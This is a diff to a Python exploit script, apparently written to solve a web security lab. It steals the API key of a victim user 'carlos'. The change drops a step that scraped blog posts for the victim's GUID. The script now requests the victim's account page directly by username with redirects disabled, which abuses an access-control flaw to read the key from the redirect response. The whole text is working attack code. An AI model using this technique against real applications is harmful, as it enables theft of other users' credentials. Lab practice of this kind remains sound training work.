@@ -41,32 +41,13 @@ def is_login_successful(url, session):
     )
     return "Log out" in response.text
 
-def get_carlos_guid(url, session):
-    response = requests.get(
-        url,
-        verify=False,
-        proxies=proxies
-    )
-    post_ids = list(set(
-        re.findall(r'postId=(\w+)"', response.text)))
-    for id in post_ids:
-        response = session.get(
-            url + "/post?postId=" + id,
-            verify=False,
-            proxies=proxies
-        )
-        if 'carlos' in response.text:
-            guid = re.findall(
-                r"userId=(.*)'", response.text)[0]
-            return guid
-        raise ValueError("Carlos' GUID not found")
-    
-def get_carlos_api_key(url, session, guid):
+def get_carlos_api_key(url, session):
     carlos_account_url = (
-        url + "/my-account?id=" + guid)
+        url + "/my-account?id=carlos")
     response = session.get(
         carlos_account_url,
         verify=False,
+        allow_redirects=False,
         proxies=proxies
     )
     if 'carlos' in response.text:
@@ -83,8 +64,7 @@ if __name__ == "__main__":
         if not is_login_successful(url, session):
             print("[-] Login was not successful.")
             sys.exit(FAIL)
-        guid = get_carlos_guid(url, session)
-        api_key = get_carlos_api_key(url, session, guid)
+        api_key = get_carlos_api_key(url, session)
         print("[+] Carlos' API Key is %s" % api_key)
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
